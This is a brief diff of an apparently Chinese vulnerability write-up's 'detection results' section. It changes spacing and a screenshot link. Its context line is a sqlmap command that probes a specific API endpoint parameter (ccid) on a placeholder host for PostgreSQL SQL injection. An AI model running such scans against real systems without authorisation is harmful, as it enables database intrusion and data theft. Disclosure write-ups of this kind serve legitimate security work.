@@ -12,7 +12,11 @@
 ## 0x02 检测结果
 
         python sqlmap.py -u https://x.x.x.x:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL
+        
+        
+        
 
 
-        ![图片](https://user-images.githubusercontent.com/118274389/229656248-0c2810cf-81dd-4dba-b482-cb235d90c638.png)
+ ![图片](https://user-images.githubusercontent.com/118274389/229656369-c2b5d26e-88a7-449e-b0e2-1029cdaafbf5.png)
+
 
